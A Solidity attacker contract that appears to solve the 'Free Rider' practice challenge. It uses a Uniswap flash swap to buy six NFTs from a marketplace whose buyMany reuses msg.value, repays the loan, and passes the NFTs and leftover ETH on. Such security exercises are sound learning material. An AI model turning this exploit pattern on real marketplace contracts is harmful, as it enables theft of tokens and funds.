// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface WETH10 {
    function deposit() external payable;

    function withdraw(uint wad) external;

    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    WETH10 public weth;
    FreeRiderNFTMarketplace public marketplace;
    address public rider;
    IUniswapV2Pair public pair;
    IERC721 public token;

    constructor(
        address _weth,
        address _marketplace,
        address _rider,
        address _pair,
        address _token
    ) payable {
        weth = WETH10(_weth);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        rider = _rider;
        pair = IUniswapV2Pair(_pair);
        token = IERC721(_token);
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        weth.withdraw(amount0);
        uint256[] memory tokenIds = new uint256[](6);

        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        marketplace.buyMany{value: 15 ether}(tokenIds);

        uint fee = 1 ether;
        uint256 amountToRepay = amount0 + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(pair), amountToRepay);

        token.safeTransferFrom(address(this), rider, 0);
        token.safeTransferFrom(address(this), rider, 1);
        token.safeTransferFrom(address(this), rider, 2);
        token.safeTransferFrom(address(this), rider, 3);
        token.safeTransferFrom(address(this), rider, 4);
        token.safeTransferFrom(address(this), rider, 5);

        (bool s, ) = payable(tx.origin).call{value: address(this).balance}("");
        require(s, "ssss");
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
